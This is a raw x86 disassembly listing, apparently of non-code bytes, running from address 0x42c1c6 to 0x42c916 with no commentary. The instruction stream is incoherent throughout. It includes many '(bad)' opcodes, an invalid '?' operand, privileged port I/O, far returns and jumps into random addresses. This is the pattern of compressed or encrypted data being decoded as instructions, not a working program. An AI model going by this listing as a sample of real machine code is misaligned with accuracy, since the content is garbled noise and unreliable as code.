  42c1c6:	push   esi
  42c1c7:	mov    eax,0xa6eb313
  42c1cc:	xor    eax,0x8f1e6736
  42c1d1:	mov    ebp,0x1036aa1
  42c1d6:	add    DWORD PTR [ebx+0x6b],ebx
  42c1d9:	add    DWORD PTR [eax-0x40482d13],ebp
  42c1df:	xor    eax,0xa2264dec
  42c1e4:	scas   al,BYTE PTR es:[edi]
  42c1e5:	mov    edi,0xb76a5bef
  42c1ea:	cmp    cl,al
  42c1ec:	out    0x3d,eax
  42c1ee:	shl    DWORD PTR [ebp+0x5],0x2c
  42c1f2:	mov    al,0x20
  42c1f4:	mov    dh,0x75
  42c1f6:	aad    0x6d
  42c1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1f9:	out    dx,eax
  42c1fa:	xchg   edi,eax
  42c1fb:	(bad)  
  42c1fc:	jns    0x42c258
  42c1fe:	dec    ebp
  42c1ff:	jbe    0x42c199
  42c201:	shr    BYTE PTR [esi],1
  42c203:	mov    ch,0xdb
  42c205:	aaa    
  42c206:	fidivr DWORD PTR [esi+0x32]
  42c209:	xor    DWORD PTR ds:0x96a429de,0xffffff96
  42c210:	mov    dh,0x56
  42c212:	mov    bl,0x5f
  42c214:	repnz retf 
  42c216:	mov    dl,0xfe
  42c218:	or     BYTE PTR [esp+ebp*2+0x18],ch
  42c21c:	fadd   DWORD PTR [esi+0x44b0321]
  42c222:	arpl   WORD PTR [eax+0x6c6ed6d2],sp
  42c228:	mov    ah,0xee
  42c22a:	pop    edx
  42c22b:	ror    BYTE PTR [ebx-0x3d5c0ac8],cl
  42c231:	imul   esp,DWORD PTR [ecx+0x354be229],0x3b2efa27
  42c23b:	retf   
  42c23c:	ficom  DWORD PTR [eax+esi*2+0x61]
  42c240:	outs   dx,DWORD PTR ds:[esi]
  42c241:	jbe    0x42c255
  42c243:	sbb    DWORD PTR [edi],edx
  42c245:	adc    esp,DWORD PTR [edx-0x293ae5ca]
  42c24b:	test   DWORD PTR [esi+eiz*2+0x6a3c4eb9],ecx
  42c252:	fistp  DWORD PTR [eax-0x28]
  42c255:	xor    eax,0x8af07ff1
  42c25a:	rol    BYTE PTR [ecx-0xc],1
  42c25d:	ins    DWORD PTR es:[edi],dx
  42c25e:	push   eax
  42c25f:	sub    eax,0x151f1fb4
  42c264:	cmp    BYTE PTR [ebp*2+0x653d142b],0x74
  42c26c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c26d:	pop    esp
  42c26f:	add    eax,0xaa969410
  42c274:	mov    edx,DWORD PTR [edx+edx*1+0x50]
  42c278:	push   ss
  42c279:	fisubr DWORD PTR [ebp-0x4f2852d3]
  42c27f:	pop    edi
  42c280:	dec    ebp
  42c281:	mov    ?,WORD PTR [edi+0x4b046c82]
  42c287:	inc    ecx
  42c288:	add    eax,esi
  42c28a:	mov    ebp,0x2c2ed0b4
  42c28f:	je     0x42c24f
  42c291:	xchg   ebx,eax
  42c292:	or     ch,BYTE PTR [ebx-0x54]
  42c295:	fmul   QWORD PTR ds:0xb0bb6d2f
  42c29b:	mov    cl,0xf7
  42c29d:	cdq    
  42c29e:	jnp    0x42c297
  42c2a0:	xor    DWORD PTR [eax+0x58],ebx
  42c2a3:	jp     0x42c2eb
  42c2a5:	shr    DWORD PTR [ebp+0x2c],1
  42c2a8:	sub    eax,0xcd089eb4
  42c2ad:	(bad)  
  42c2ae:	cmp    BYTE PTR [edi+0x3],cl
  42c2b1:	das    
  42c2b2:	pop    ss
  42c2b3:	sub    BYTE PTR [ebp-0x48],bh
  42c2b6:	fwait
  42c2b7:	cwde   
  42c2b8:	int    0xee
  42c2ba:	fild   QWORD PTR [eax+0x5]
  42c2bd:	in     al,0x7b
  42c2bf:	popa   
  42c2c0:	jne    0x42c263
  42c2c2:	jno    0x42c2ef
  42c2c4:	cmp    esp,DWORD PTR [esp+edi*4-0x13]
  42c2c8:	mov    esi,0x600a5377
  42c2cd:	fist   DWORD PTR ds:0x290b8f63
  42c2d3:	mov    cl,0xe
  42c2d5:	pusha  
  42c2d6:	or     ebp,edx
  42c2d8:	fwait
  42c2d9:	add    DWORD PTR [edx],eax
  42c2db:	in     eax,dx
  42c2dc:	enter  0x754,0x11
  42c2e0:	fcmovnbe st,st(0)
  42c2e2:	dec    eax
  42c2e3:	or     eax,eax
  42c2e5:	sbb    al,0xf3
  42c2e7:	ror    BYTE PTR [ebp-0x37c33693],1
  42c2ed:	inc    edi
  42c2ee:	mov    WORD PTR [eax+0x2877ed45],es
  42c2f4:	or     dl,BYTE PTR [ebx+edx*1-0x6d]
  42c2f8:	int    0xea
  42c2fa:	push   eax
  42c2fb:	sbb    esp,DWORD PTR [edx]
  42c2fd:	mov    dh,0x34
  42c2ff:	mov    al,0xce
  42c301:	cli    
  42c302:	xor    BYTE PTR [esi+0x10db5b0],0xe1
  42c309:	arpl   WORD PTR [esi-0x77],bp
  42c30c:	iret   
  42c30d:	pop    ebx
  42c30e:	into   
  42c30f:	xor    dl,BYTE PTR [ecx]
  42c311:	jno    0x42c2f5
  42c313:	(bad)  
  42c314:	loope  0x42c36b
  42c316:	repnz mov cl,0xf4
  42c319:	dec    edx
  42c31a:	shl    BYTE PTR [esi+0x2efc64b0],1
  42c320:	popf   
  42c321:	outs   dx,BYTE PTR ds:[esi]
  42c322:	dec    ecx
  42c323:	push   esp
  42c324:	pop    ebp
  42c325:	inc    ecx
  42c326:	pop    esp
  42c327:	fsubr  DWORD PTR [ebp-0x587795cd]
  42c32d:	or     DWORD PTR [ebx],esp
  42c32f:	adc    eax,0x961b0b6d
  42c334:	sub    al,0x40
  42c336:	sub    eax,0xc14d9014
  42c33b:	lods   eax,DWORD PTR ds:[esi]
  42c33c:	lods   eax,DWORD PTR ds:[esi]
  42c33d:	fsincos 
  42c33f:	retf   0xa931
  42c342:	in     eax,dx
  42c343:	or     al,0x51
  42c345:	mov    ebx,0x238a3941
  42c34a:	inc    esp
  42c34b:	into   
  42c34c:	sub    ch,BYTE PTR [eax]
  42c34e:	clc    
  42c34f:	ret    0x89ad
  42c352:	push   0x32
  42c354:	inc    ebp
  42c355:	push   ecx
  42c356:	add    bl,BYTE PTR [edx+edi*1+0x34]
  42c35a:	pop    eax
  42c35b:	fcomp  st(2)
  42c35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c35e:	inc    ecx
  42c35f:	test   DWORD PTR [ebx-0x41],ecx
  42c362:	sub    DWORD PTR [eax+0x55],ebx
  42c365:	scas   eax,DWORD PTR es:[edi]
  42c366:	mov    al,0xd0
  42c368:	adc    BYTE PTR [ebp+0x2e],bl
  42c36b:	push   edi
  42c36c:	out    0xd,eax
  42c36e:	cmp    ebp,eax
  42c370:	daa    
  42c371:	imul   esp,DWORD PTR [ecx+0x78c7bb7c],0xffffffba
  42c378:	inc    ecx
  42c379:	xchg   esp,eax
  42c37a:	add    ch,bl
  42c37c:	cmp    BYTE PTR [edx+0x15],ch
  42c37f:	or     dh,BYTE PTR [esi-0x148f5273]
  42c385:	mov    ah,BYTE PTR [esi+0x2030d077]
  42c38b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c38c:	ficom  DWORD PTR [ecx]
  42c38e:	jge    0x42c3ec
  42c390:	fidivr DWORD PTR [edx+0x55]
  42c393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c394:	(bad)  
  42c395:	retf   0x5172
  42c398:	inc    ecx
  42c399:	fstp   QWORD PTR [eax+0x28]
  42c39c:	mov    ch,0x85
  42c39e:	mov    dl,0x36
  42c3a0:	adc    DWORD PTR [edx+ebx*8],edi
  42c3a3:	ucomiss xmm2,xmm0
  42c3a6:	adc    DWORD PTR [eax],ebx
  42c3a8:	inc    edx
  42c3a9:	ds mov ebp,0xd73f74e9
  42c3af:	stc    
  42c3b0:	ret    0xddad
  42c3b3:	cwde   
  42c3b4:	pop    ebx
  42c3b5:	(bad)  
  42c3b6:	and    BYTE PTR [ecx+0x1d],al
  42c3b9:	es (bad) 
  42c3bb:	pop    ss
  42c3bc:	add    BYTE PTR [ecx],bl
  42c3be:	push   edx
  42c3bf:	pop    eax
  42c3c0:	fisubr WORD PTR [esi+0x6d]
  42c3c3:	fwait
  42c3c4:	inc    edi
  42c3c5:	xlat   BYTE PTR ds:[ebx]
  42c3c6:	mov    bh,0xe9
  42c3c8:	sahf   
  42c3c9:	add    DWORD PTR [eax],0xb689c0ee
  42c3cf:	pop    ebp
  42c3d0:	fmul   DWORD PTR [ecx]
  42c3d2:	cmp    eax,0x92bf161f
  42c3d7:	and    dh,BYTE PTR [esi+0x7b7051d3]
  42c3dd:	mov    ds:0x11cbeec0,al
  42c3e2:	xor    eax,0x2e16d14d
  42c3e7:	xor    eax,0x871702e5
  42c3ec:	enter  0x45b8,0xce
  42c3f0:	(bad)  [esi-0x20034f50]
  42c3f6:	cli    
  42c3f7:	test   DWORD PTR es:[edi+ebp*8-0x3efde51c],esp
  42c3ff:	push   es
  42c400:	adc    al,0x85
  42c402:	xor    BYTE PTR [edi],dh
  42c404:	pop    ecx
  42c405:	lea    edx,cs:[edx]
  42c408:	push   eax
  42c409:	adc    ebx,esi
  42c40b:	lods   eax,DWORD PTR ds:[esi]
  42c40c:	or     al,0xe1
  42c40e:	arpl   WORD PTR [ebx+0x11],ax
  42c411:	retf   
  42c412:	push   cs
  42c413:	push   cs
  42c414:	inc    ebp
  42c415:	dec    ecx
  42c416:	sahf   
  42c417:	and    DWORD PTR [ecx],0x1
  42c41a:	mov    BYTE PTR [esi+0x6e6a826a],cl
  42c420:	inc    esi
  42c421:	jbe    0x42c44e
  42c423:	push   ebp
  42c424:	imul   edx,eax,0xffffff9d
  42c427:	es gs iret 
  42c42a:	sub    al,0xcb
  42c42c:	pop    ebx
  42c42d:	sbb    eax,0xecdbdb51
  42c432:	popf   
  42c433:	sub    DWORD PTR [eax-0x7f7296c3],edi
  42c439:	mov    fs,WORD PTR [eax+0x68bd878e]
  42c43f:	mov    eax,ds:0xd7b5b540
  42c444:	mov    edi,0x2b747989
  42c449:	retf   
  42c44a:	mov    dl,0x76
  42c44d:	int3   
  42c44e:	fiadd  WORD PTR [eax+0x2a8c9196]
  42c454:	(bad)  
  42c455:	loope  0x42c40c
  42c457:	mov    al,0xd4
  42c459:	inc    ecx
  42c45a:	push   ebp
  42c45b:	(bad)
  42c45e:	test   eax,0xdb8a3ae3
  42c463:	mov    dh,0x9d
  42c465:	xor    ebx,DWORD PTR [eax-0x58fab267]
  42c46b:	mov    dh,0xcc
  42c46d:	mov    al,0xd0
  42c46f:	push   esp
  42c470:	add    BYTE PTR [ecx],ah
  42c472:	in     al,dx
  42c473:	or     BYTE PTR [ecx+eiz*4+0x51db46e5],ch
  42c47a:	stc    
  42c47b:	adc    BYTE PTR [ebx],cl
  42c47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c47e:	div    BYTE PTR [esi-0x65e92510]
  42c484:	and    BYTE PTR [edx+0x70],0xc1
  42c488:	or     eax,0x8d805f83
  42c48d:	xchg   BYTE PTR [edx-0x27740fb],al
  42c493:	adc    DWORD PTR [ecx+eax*1],esp
  42c496:	ins    BYTE PTR es:[edi],dx
  42c497:	mov    ah,0xf2
  42c499:	fist   WORD PTR [eax+eax*1]
  42c49c:	xor    DWORD PTR [esi+0x3],0x5b6c0bb6
  42c4a3:	or     eax,0x50400aef
  42c4a8:	(bad)  
  42c4a9:	dec    ebx
  42c4aa:	sbb    BYTE PTR [edx],ah
  42c4ac:	and    eax,0xbc8283a8
  42c4b1:	gs cld 
  42c4b3:	add    ecx,DWORD PTR [ebx]
  42c4b5:	mov    bh,0xe
  42c4b7:	stos   BYTE PTR es:[edi],al
  42c4b8:	push   edi
  42c4b9:	sub    ebp,DWORD PTR [eax-0x65155723]
  42c4bf:	add    DWORD PTR [ebx+0x506816b6],eax
  42c4c5:	xchg   esi,eax
  42c4c6:	in     al,dx
  42c4c7:	pop    ebx
  42c4c8:	dec    ebp
  42c4c9:	fild   QWORD PTR [esi]
  42c4cb:	sub    BYTE PTR [ebp+0x6b],0xf1
  42c4cf:	test   eax,0xddd526b2
  42c4d4:	ss inc ecx
  42c4d6:	(bad)  
  42c4d8:	or     ebx,DWORD PTR [esi-0x59]
  42c4db:	cmp    esp,0x26
  42c4de:	(bad)  
  42c4df:	push   ss
  42c4e0:	stc    
  42c4e1:	jne    0x42c524
  42c4e3:	ins    DWORD PTR es:[edi],dx
  42c4e4:	mov    BYTE PTR ds:0x3816bffe,cl
  42c4ea:	(bad)  [esi+0x42652e3e]
  42c4f0:	xor    BYTE PTR [edi+0x6b9a49a6],bl
  42c4f6:	cmp    BYTE PTR [edx],bl
  42c4f8:	push   cs
  42c4f9:	fcomp  QWORD PTR [edx+0x62]
  42c4fc:	mov    esp,0x9bd30d94
  42c501:	sub    eax,0x5c510df3
  42c506:	add    ah,ch
  42c508:	ins    BYTE PTR es:[edi],dx
  42c509:	sbb    eax,0xb6eafc3b
  42c50e:	mov    ch,0x1b
  42c510:	imul   dl
  42c512:	xchg   esp,eax
  42c513:	das    
  42c514:	mov    eax,ds:0xcf87ec6c
  42c519:	fcomp  st(2)
  42c51b:	lods   eax,DWORD PTR ds:[esi]
  42c51c:	stos   DWORD PTR es:[edi],eax
  42c51d:	rcl    DWORD PTR [eax+0x2],cl
  42c520:	lahf   
  42c521:	lds    eax,FWORD PTR [edi-0x59]
  42c524:	pop    edi
  42c525:	xor    dl,BYTE PTR [eax]
  42c527:	aaa    
  42c528:	xchg   esi,eax
  42c529:	and    eax,0x6813cce9
  42c52e:	add    al,0x68
  42c530:	mov    bh,0x8d
  42c532:	lods   eax,DWORD PTR ds:[esi]
  42c533:	pop    es
  42c534:	cmp    edx,DWORD PTR [eax-0x6e5b8568]
  42c53a:	rcr    DWORD PTR [ebx+0x6d],1
  42c53d:	sub    ebx,DWORD PTR [edx+0x4f]
  42c540:	loopne 0x42c567
  42c542:	(bad)  
  42c543:	mov    edx,edi
  42c545:	mov    ebp,0x1b2c06b7
  42c54a:	dec    ebx
  42c54b:	lods   al,BYTE PTR ds:[esi]
  42c54c:	xchg   ebp,eax
  42c54d:	xor    eax,DWORD PTR [ecx+0xa]
  42c550:	rcr    BYTE PTR [edx-0x25],1
  42c553:	push   esp
  42c554:	ins    DWORD PTR es:[edi],dx
  42c555:	rcl    esp,1
  42c557:	jle    0x42c4fa
  42c559:	inc    ecx
  42c55a:	push   ebx
  42c55b:	push   cs
  42c55c:	(bad)  
  42c55d:	inc    ebp
  42c55e:	mov    cl,0x15
  42c560:	mov    esp,0x7658e156
  42c565:	and    bl,bl
  42c567:	(bad)  
  42c568:	rcl    dl,cl
  42c56a:	mov    bl,BYTE PTR [edi+0x47]
  42c56d:	xchg   BYTE PTR [eax],bl
  42c56f:	lahf   
  42c570:	es push ebx
  42c572:	push   0x76
  42c574:	and    DWORD PTR [esi],0xffffff80
  42c577:	xchg   BYTE PTR [ebx+edi*2-0x6b],dh
  42c57b:	jge    0x42c4fe
  42c57d:	pop    ecx
  42c57e:	push   esp
  42c57f:	fst    QWORD PTR [esi]
  42c581:	fisub  DWORD PTR [edi+eax*2+0x4c]
  42c585:	in     al,0x20
  42c587:	idiv   DWORD PTR [esi-0x60]
  42c58a:	loopne 0x42c542
  42c58c:	jne    0x42c58d
  42c58e:	dec    ecx
  42c58f:	sub    al,0xf3
  42c591:	add    bl,BYTE PTR [ebx+0xd]
  42c594:	lea    ebp,[ebp+0x61]
  42c597:	imul   ebx,esi,0x50
  42c59a:	jecxz  0x42c53a
  42c59c:	jo     0x42c59d
  42c59e:	out    dx,eax
  42c59f:	cmp    BYTE PTR ds:0x85dadd57,dl
  42c5a5:	jno    0x42c5f0
  42c5a7:	jg     0x42c5ad
  42c5a9:	add    eax,0x67e9c971
  42c5ae:	fimul  DWORD PTR [esi]
  42c5b0:	test   al,0x5b
  42c5b2:	outs   dx,DWORD PTR ds:[esi]
  42c5b3:	or     dl,dl
  42c5b5:	scas   eax,DWORD PTR es:[edi]
  42c5b6:	dec    esi
  42c5b7:	fnsavew es:[eax-0x2dc95f4b]
  42c5bf:	sbb    dh,BYTE PTR [eax+0x47]
  42c5c2:	or     eax,0xba0edadc
  42c5c7:	(bad)  
  42c5c8:	(bad)  
  42c5ca:	or     eax,0x2fe9abc5
  42c5cf:	jne    0x42c5f2
  42c5d1:	inc    ebp
  42c5d2:	mov    bh,0xb6
  42c5d4:	sub    eax,0x3fece5b
  42c5d9:	out    dx,eax
  42c5da:	xchg   ebp,eax
  42c5db:	xchg   ecx,eax
  42c5dc:	gs ins DWORD PTR es:[edi],dx
  42c5de:	imul   ecx,DWORD PTR [eax+0x2680184d],0xfffffff3
  42c5e5:	push   0x582c93cb
  42c5ea:	fadd   DWORD PTR [eax]
  42c5ec:	shr    BYTE PTR [eax],1
  42c5ee:	adc    DWORD PTR [ebx],edi
  42c5f0:	rcl    DWORD PTR ds:0x6c5036ee,cl
  42c5f6:	mov    BYTE PTR [eax-0x39],bl
  42c5f9:	dec    edi
  42c5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5fb:	cld    
  42c5fc:	mov    edi,0x320b696d
  42c601:	retf   0x98e0
  42c604:	jno    0x42c58b
  42c606:	lds    esp,FWORD PTR [esi]
  42c608:	sub    BYTE PTR ds:0x9640f980,0x50
  42c60f:	ss push ecx
  42c611:	fisttp DWORD PTR [ebp-0x19ce136]
  42c617:	mov    ecx,0x10d7a938
  42c61c:	shl    DWORD PTR [esi-0x4ac1d713],1
  42c622:	int3   
  42c623:	jecxz  0x42c69a
  42c625:	sbb    eax,0x8801b4bb
  42c62a:	pop    ebp
  42c62b:	inc    esi
  42c62c:	fistp  WORD PTR [edi-0x71abab60]
  42c632:	loopne 0x42c60a
  42c634:	inc    ebp
  42c635:	lahf   
  42c636:	clc    
  42c637:	in     al,dx
  42c638:	push   ebp
  42c639:	xchg   edi,eax
  42c63a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c63b:	push   edx
  42c63c:	or     eax,0x47ebdb05
  42c641:	mov    WORD PTR [ecx+0x2b],fs
  42c644:	or     eax,0xb42c11ff
  42c649:	(bad)  
  42c64a:	xor    eax,ebx
  42c64c:	addr16 sbb eax,ecx
  42c64f:	adc    eax,0xfdd042b7
  42c654:	(bad)
  42c659:	mov    dh,0xe
  42c65b:	or     BYTE PTR [esi+0x45],dh
  42c65e:	jmp    0x3c140116
  42c663:	xor    ch,BYTE PTR [esi]
  42c665:	je     0x42c6bc
  42c667:	(bad)  [esi-0x7f]
  42c66a:	inc    ebp
  42c66b:	mov    al,al
  42c66d:	inc    ebx
  42c66e:	int    0x4a
  42c670:	lods   eax,DWORD PTR ds:[esi]
  42c671:	sbb    edx,0xbcdf5a36
  42c677:	std    
  42c678:	or     DWORD PTR [ebp+0x6e],ebx
  42c67b:	push   ss
  42c67c:	xchg   esi,eax
  42c67d:	mov    dh,0xb6
  42c67f:	loope  0x42c658
  42c681:	fisttp DWORD PTR [esi-0x7da4a632]
  42c687:	add    al,0xc5
  42c689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c68a:	dec    edx
  42c68b:	mov    bh,0xa6
  42c68d:	jns    0x42c616
  42c68f:	xchg   BYTE PTR [esi],dh
  42c691:	aas    
  42c692:	not    BYTE PTR [esi]
  42c694:	rol    BYTE PTR cs:[esp+ecx*4-0x7f],1
  42c699:	sbb    BYTE PTR [esi-0x457eaa1a],bh
  42c69f:	shl    DWORD PTR [esi+0x264411d4],0x14
  42c6a6:	sub    DWORD PTR [ebx-0x7e8e1ac6],esi
  42c6ac:	lods   eax,DWORD PTR ds:[esi]
  42c6ad:	stos   DWORD PTR es:[edi],eax
  42c6ae:	sbb    al,BYTE PTR [ebx+edx*2+0x608dfcca]
  42c6b5:	jo     0x42c640
  42c6b7:	mov    dh,0xb4
  42c6b9:	sub    dl,BYTE PTR [esi+0x17]
  42c6bc:	daa    
  42c6bd:	into   
  42c6be:	sbb    BYTE PTR [ebx],0xe0
  42c6c1:	or     ebx,ebx
  42c6c3:	repnz das 
  42c6c5:	xor    BYTE PTR [eax+eax*1],al
  42c6c8:	adc    eax,0xb1ee0049
  42c6cd:	call   0x2e3d0019
  42c6d2:	mov    dh,0x85
  42c6d4:	jbe    0x42c741
  42c6d6:	xchg   BYTE PTR [esi],bh
  42c6d8:	cmp    BYTE PTR [esi],dl
  42c6da:	mov    bl,0x76
  42c6dc:	lods   al,BYTE PTR ds:[esi]
  42c6dd:	cmc    
  42c6de:	(bad)  
  42c6df:	mov    dh,0x35
  42c6e1:	add    al,0xdd
  42c6e3:	pop    ss
  42c6e4:	test   eax,0xcea0b8a7
  42c6e9:	add    eax,0xb4b1b5c
  42c6ee:	fcomi  st,st(3)
  42c6f0:	(bad)  
  42c6f2:	push   ss
  42c6f3:	jp     0x42c6c0
  42c6f5:	popf   
  42c6f6:	dec    eax
  42c6f7:	lds    esi,FWORD PTR [edi+0x776e2a26]
  42c6fd:	scas   al,BYTE PTR es:[edi]
  42c6fe:	ret    
  42c6ff:	push   esi
  42c700:	into   
  42c701:	rcr    DWORD PTR ds:0x45361630,1
  42c707:	ins    BYTE PTR es:[edi],dx
  42c708:	into   
  42c709:	cmp    al,0xf
  42c70b:	lahf   
  42c70c:	jo     0x42c736
  42c70e:	ins    BYTE PTR es:[edi],dx
  42c70f:	fiadd  DWORD PTR [eax-0x65b8d752]
  42c715:	lea    ecx,[ebp-0x7517f52a]
  42c71b:	dec    ebx
  42c71c:	mov    ds:0x1b6db321,al
  42c721:	in     eax,dx
  42c722:	sar    BYTE PTR [ebx+0x26224cdd],cl
  42c728:	dec    ebx
  42c729:	nop
  42c72a:	je     0x42c6c6
  42c72c:	ss ss retf 0x7d2f
  42c731:	cmp    esi,ebx
  42c733:	add    ch,ah
  42c735:	adc    BYTE PTR [esi-0x4a],ah
  42c738:	js     0x42c6e1
  42c73a:	sub    BYTE PTR [esi],dh
  42c73c:	sub    BYTE PTR ss:[ecx+0x1f],0xfc
  42c741:	jno    0x42c71e
  42c743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c744:	lods   eax,DWORD PTR ds:[esi]
  42c745:	mov    ds,WORD PTR [eax-0x2]
  42c748:	add    edi,edi
  42c74a:	bound  eax,QWORD PTR [esi]
  42c74c:	test   al,0xfb
  42c74e:	rol    BYTE PTR [ebp+ebx*2-0x28],0x68
  42c753:	pop    ecx
  42c754:	xchg   esi,eax
  42c755:	push   esi
  42c756:	pop    eax
  42c757:	popa   
  42c758:	lahf   
  42c759:	shr    BYTE PTR [esi+0x7bef762a],0x85
  42c760:	and    DWORD PTR [ecx+0x608bb451],ebx
  42c766:	pop    ss
  42c767:	rcl    DWORD PTR [ecx-0x55dd43f6],cl
  42c76d:	push   edx
  42c76e:	mov    ebx,0xc36311d0
  42c773:	sbb    DWORD PTR [edi+edi*1],ebp
  42c776:	loopne 0x42c7bf
  42c778:	mov    cl,0xa3
  42c77a:	sbb    bl,0x28
  42c77d:	jge    0x42c735
  42c77f:	dec    edx
  42c780:	imul   DWORD PTR [esi+ecx*1]
  42c783:	mov    dh,0x5a
  42c785:	rcl    BYTE PTR [eax],1
  42c787:	and    BYTE PTR [ecx+ecx*2+0x49],bh
  42c78b:	cmp    ecx,DWORD PTR ss:[edx+0x9d128d8]
  42c792:	push   ds
  42c793:	(bad)  
  42c794:	je     0x42c736
  42c796:	ins    DWORD PTR es:[edi],dx
  42c797:	pop    es
  42c798:	add    DWORD PTR [ebp-0x4d6bd1b],esp
  42c79e:	inc    eax
  42c79f:	or     eax,0x2b8ec45
  42c7a4:	aam    0x37
  42c7a6:	jle    0x42c763
  42c7a8:	test   al,0xa9
  42c7aa:	mov    dh,0xb9
  42c7ac:	outs   dx,BYTE PTR ds:[esi]
  42c7ad:	jge    0x42c80f
  42c7af:	sti    
  42c7b0:	sbb    DWORD PTR [ecx],0xffffff93
  42c7b3:	jne    0x42c7ca
  42c7b5:	mov    cl,0x6d
  42c7b7:	or     BYTE PTR [esi],ah
  42c7b9:	clc    
  42c7ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c7bb:	hlt    
  42c7bc:	retf   0xb506
  42c7bf:	mov    al,0x6d
  42c7c1:	call   0x1671df7a
  42c7c6:	neg    DWORD PTR [ecx-0x4a]
  42c7c9:	sub    eax,0x2844b6dc
  42c7ce:	fnstsw WORD PTR [ecx]
  42c7d0:	mov    eax,0x3708ded6
  42c7d5:	(bad)  
  42c7d7:	aad    0xad
  42c7d9:	(bad)  
  42c7da:	sbb    ah,bh
  42c7dc:	add    edx,ebp
  42c7de:	cli    
  42c7df:	enter  0x2cb8,0x8d
  42c7e3:	test   DWORD PTR [esi],ecx
  42c7e5:	sub    BYTE PTR [esi+0x41],cl
  42c7e8:	scas   eax,DWORD PTR es:[edi]
  42c7e9:	xlat   BYTE PTR ds:[ebx]
  42c7ea:	jb     0x42c7a0
  42c7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7ed:	add    dh,0xf5
  42c7f0:	in     eax,dx
  42c7f1:	mov    bh,0xfb
  42c7f3:	push   edx
  42c7f4:	inc    ecx
  42c7f5:	imul   eax,DWORD PTR [ebp+ebp*1+0x2c],0xffffffaf
  42c7fa:	stc    
  42c7fb:	addr16 fwait
  42c7fd:	or     esp,DWORD PTR [ebp+0x0]
  42c800:	push   0xffffffad
  42c802:	push   0x11
  42c804:	shr    esp,1
  42c806:	cmp    eax,DWORD PTR [eax+0x13c7260b]
  42c80c:	mov    bl,0x23
  42c80e:	fst    st(2)
  42c810:	lds    eax,FWORD PTR [edi+0x55]
  42c813:	ret    
  42c814:	pop    es
  42c815:	xchg   ebp,eax
  42c816:	fstp   QWORD PTR [esi-0x70]
  42c819:	sub    eax,0x46ed6c2e
  42c81e:	lahf   
  42c81f:	int3   
  42c820:	push   ecx
  42c821:	mov    ds:0x49b69202,eax
  42c826:	mov    bh,0xb
  42c828:	popa   
  42c829:	jecxz  0x42c881
  42c82b:	fcomp  DWORD PTR [eax+0x1a95a959]
  42c831:	inc    ebx
  42c832:	sub    eax,0x6b74cbe
  42c837:	mov    ch,BYTE PTR [ebp-0x7a]
  42c83a:	xchg   BYTE PTR [esi],ah
  42c83c:	jbe    0x42c841
  42c83e:	sub    DWORD PTR [ebx+0x1e],edx
  42c841:	sbb    DWORD PTR [eax+0x3c9e6d1f],ecx
  42c847:	fbld   TBYTE PTR [ebx]
  42c849:	lods   al,BYTE PTR ds:[esi]
  42c84a:	lods   al,BYTE PTR ds:[esi]
  42c84b:	sbb    esp,DWORD PTR [edx]
  42c84d:	cs inc ecx
  42c84f:	or     DWORD PTR [edi+0x195f478d],0xffffffb6
  42c856:	lea    eax,[edx+0x6b]
  42c859:	aam    0xf2
  42c85b:	mov    ds:0xf3aa636f,al
  42c860:	mov    eax,ds:0x8cd6e22b
  42c865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c866:	xchg   edx,eax
  42c867:	cmc    
  42c868:	stos   BYTE PTR es:[edi],al
  42c869:	aas    
  42c86a:	and    ch,BYTE PTR [ebx-0x49]
  42c86d:	jbe    0x42c8d8
  42c86f:	pusha  
  42c870:	sub    DWORD PTR [ecx+eiz*1+0x5d3aaad1],edx
  42c877:	adc    al,0x9e
  42c879:	adc    eax,0x7876ab71
  42c87e:	xchg   ecx,eax
  42c87f:	pop    edi
  42c880:	sbb    dl,0x2f
  42c883:	je     0x42c828
  42c885:	and    ebx,edx
  42c887:	or     esi,DWORD PTR [esp+ecx*8-0x7c]
  42c88b:	inc    esp
  42c88c:	mov    cl,BYTE PTR [ecx-0x14]
  42c88f:	mov    ch,BYTE PTR [ebp-0x25]
  42c892:	add    BYTE PTR [ebx+ebx*8+0x58],al
  42c896:	inc    ecx
  42c897:	xor    al,0x50
  42c899:	xchg   DWORD PTR [ebp+0x4],ecx
  42c89c:	fild   DWORD PTR [esi]
  42c89e:	and    ah,BYTE PTR [edx]
  42c8a0:	xchg   esi,eax
  42c8a1:	or     DWORD PTR [edx],0xffffffb7
  42c8a4:	sub    al,0x40
  42c8a6:	pop    ebx
  42c8a7:	mov    ebx,0x748f236d
  42c8ac:	mov    esi,0x328c4760
  42c8b1:	mov    dh,0xbc
  42c8b3:	shr    BYTE PTR [ebp+0x2512aa77],0x1e
  42c8ba:	enter  0xff00,0x43
  42c8be:	mov    al,0x17
  42c8c0:	shl    BYTE PTR [esi],1
  42c8c2:	jmp    0xc50e:0xdb55f708
  42c8c9:	pop    ebp
  42c8ca:	add    al,0xb7
  42c8cc:	add    BYTE PTR [eax],dh
  42c8ce:	push   ds
  42c8cf:	xchg   ecx,eax
  42c8d0:	jge    0x42c923
  42c8d2:	fstp   TBYTE PTR [edx]
  42c8d4:	add    BYTE PTR [esi+0x7eda7164],dh
  42c8da:	mov    ds:0x4029072f,eax
  42c8df:	shr    BYTE PTR [ebp+0x63],1
  42c8e2:	pop    ebx
  42c8e3:	aas    
  42c8e4:	sub    eax,0x4b9d3623
  42c8e9:	mov    ch,0xb0
  42c8eb:	xor    eax,0x1b05d229
  42c8f0:	sub    bh,cl
  42c8f2:	inc    ecx
  42c8f3:	mov    ecx,0xa37155d
  42c8f8:	call   0x8afd2648
  42c8fd:	sub    BYTE PTR [esi],0x94
  42c900:	outs   dx,BYTE PTR ds:[esi]
  42c901:	or     ecx,DWORD PTR [ecx-0x6b]
  42c904:	ds (bad) 
  42c907:	mov    ecx,0x80f957ac
  42c90c:	lea    ebp,[esi]
  42c90e:	or     BYTE PTR [edx],bl
  42c910:	shr    DWORD PTR [esi+0x5ad96dd5],cl
  42c916:	aam    0x66
